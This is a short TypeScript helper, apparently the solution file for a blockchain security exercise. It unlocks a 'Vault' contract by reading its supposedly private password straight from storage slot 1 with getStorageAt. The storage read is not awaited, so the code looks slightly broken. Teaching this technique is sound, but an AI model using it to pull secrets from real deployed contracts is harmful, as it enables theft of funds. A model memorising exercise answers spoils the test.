import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  /* 
    Add code here that will help you pass the test
    Note: Unlock without using the string "A very strong password"
    Unlock the vault by somehow reading the private password from 
    Vault directly
  */
  const provider = new ethers.providers.JsonRpcProvider("http://localhost:8545");
  /* NOTE: 
    The getStorageAt() method in Ether.js allows you to access the value of a storage variable 
    in a smart contract, by passing the contract address and the position of the variable 
    in the storage trie as arguments. This method doesn't care about the visibility of the variable, 
    it just access the value of the variable based on the position passed as argument.
  */
  const password = provider.getStorageAt(victim.address, 1)
  await victim.unlock(password);
};

export default helper;
